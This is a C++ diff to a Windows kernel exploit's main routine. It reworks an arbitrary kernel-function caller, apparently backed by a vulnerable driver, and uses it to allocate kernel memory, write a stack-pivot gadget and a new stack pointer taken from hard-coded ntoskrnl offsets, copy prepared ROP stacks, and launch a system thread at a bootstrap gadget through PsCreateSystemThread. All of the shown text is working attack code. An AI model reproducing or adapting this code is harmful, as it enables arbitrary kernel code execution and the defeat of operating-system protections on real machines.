@@ -37,22 +37,19 @@ int main()
     std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
     std::printf("[+] ntoskrnl.exe @ 0x%p\n", Globals::KernelBase);
 
-    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller();
+    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller("NtReadFileScatter");
 
-    const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");
+    void* PivotDataAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x58, reinterpret_cast<void*>(MAXULONG64));
+    void* DestinationStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
+    void* SourceStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
+    void* ObjectAttributeArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(OBJECT_ATTRIBUTES), reinterpret_cast<void*>(MAXULONG64));
+    void* OutputHandleArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
+    void* MainStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
+    void* InitStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
+    Globals::DummyMemoryAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
+    Globals::CurrentStackOffsetAddress = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
+    Globals::StackLimitStoreAddress = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
 
-    KernelCaller.RedirectCallByName("NtShutdownSystem", "MmAllocateContiguousMemory");
-    void* PivotDataAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x58, (void*)MAXULONG64);
-    void* DestinationStringArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
-    void* SourceStringArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
-    void* ObjectAttributeArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(sizeof(OBJECT_ATTRIBUTES), (void*)MAXULONG64);
-    void* OutputHandleArg = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
-    void* MainStackAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x6000, (void*)MAXULONG64);
-    void* InitStackAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x6000, (void*)MAXULONG64);
-    Globals::DummyMemoryAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
-    Globals::CurrentStackOffsetAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
-    Globals::StackLimitStoreAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
-    KernelCaller.DisableRedirectByName("NtShutdownSystem");
     std::printf("[+] Main Stack @ 0x%p\n", MainStackAllocation);
     std::printf("[+] Init Stack @ 0x%p\n", InitStackAllocation);
     std::printf("[+] Current Stack Offset @ 0x%p\n", Globals::CurrentStackOffsetAddress);
@@ -61,11 +58,9 @@ int main()
         return EXIT_FAILURE;
 
     // Zero out stack allocation
-    KernelCaller.RedirectCallByName("NtShutdownSystem", "RtlZeroMemory");
-    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(MainStackAllocation, 0x6000);
-    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(InitStackAllocation, 0x6000);
-    reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(Globals::CurrentStackOffsetAddress, 0x8);
-    KernelCaller.DisableRedirectByName("NtShutdownSystem");
+    KernelCaller.Call<void*, void*, size_t>("RtlZeroMemory", MainStackAllocation, 0x6000);
+    KernelCaller.Call<void*, void*, size_t>("RtlZeroMemory", InitStackAllocation, 0x6000);
+    KernelCaller.Call<void*, void*, size_t>("RtlZeroMemory", Globals::CurrentStackOffsetAddress, 0x8);
 
     // Create usermode event
     const wchar_t* EventNameString = L"\\BaseNamedObjects\\Global\\MYSIGNALEVENT";
@@ -102,15 +97,13 @@ int main()
     void* PivotJumpAddress = (void*)(Globals::KernelBase + 0x20043b);
     void* NewRspAddress = (void*)((uint64_t)InitStackAllocation + 0x2000);
 
-    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x50), &PivotJumpAddress, sizeof(PivotJumpAddress));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x10), &NewRspAddress, sizeof(NewRspAddress));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(SourceStringArg, (void*)EventNameString, lstrlenW(EventNameString) * 2 + 2);
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(Globals::CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)MainStackAllocation + 0x2000), MainStackManager.GetStackBuffer(), MainStackManager.GetStackSize());
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)InitStackAllocation + 0x2000), InitStackManager.GetStackBuffer(), InitStackManager.GetStackSize());
-    KernelCaller.DisableRedirectByName("NtShutdownSystem");
+    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uint64_t)PivotDataAllocation + 0x50), &PivotJumpAddress, sizeof(PivotJumpAddress));
+    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uint64_t)PivotDataAllocation + 0x10), &NewRspAddress, sizeof(NewRspAddress));
+    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", SourceStringArg, (void*)EventNameString, lstrlenW(EventNameString) * 2 + 2);
+    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
+    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", Globals::CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
+    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uintptr_t)MainStackAllocation + 0x2000), MainStackManager.GetStackBuffer(), MainStackManager.GetStackSize());
+    KernelCaller.Call<void*, void*, void*, size_t>("memcpy", (void*)((uintptr_t)InitStackAllocation + 0x2000), InitStackManager.GetStackBuffer(), InitStackManager.GetStackSize());
 
     Sleep(500);
     std::cin.get();
@@ -119,18 +112,24 @@ int main()
     void* BootstrapGadget = (void*)(Globals::KernelBase + 0x698bd0);
 
     HANDLE KernelThreadHandle;
-    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, PivotDataAllocation);
-    NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
+    NTSTATUS ThreadCreationStatus = KernelCaller.Call<NTSTATUS, PHANDLE, ULONG, OBJECT_ATTRIBUTES*, HANDLE, void*, void*, void*>(
+        "PsCreateSystemThread",
         &KernelThreadHandle,
         THREAD_ALL_ACCESS,
         NULL,
-        NULL
+        NULL,
+        NULL,
+        BootstrapGadget,
+        PivotDataAllocation
     );
-    KernelCaller.DisableRedirectByName("NtShutdownSystem");
 
-    KernelCaller.RedirectCallByName("NtShutdownSystem", "ZwClose");
-    reinterpret_cast<void* (*)(HANDLE)>(NtShutdownSystem)(KernelThreadHandle);
-    KernelCaller.DisableRedirectByName("NtShutdownSystem");
+    if (!NT_SUCCESS(ThreadCreationStatus))
+    {
+        std::printf("[-] PsCreateSystemThread failed with status: 0x%X\n", ThreadCreationStatus);
+        return EXIT_FAILURE;
+    }
+
+    KernelCaller.Call<void*, HANDLE>("ZwClose", KernelThreadHandle);
 
     return EXIT_SUCCESS;
 }
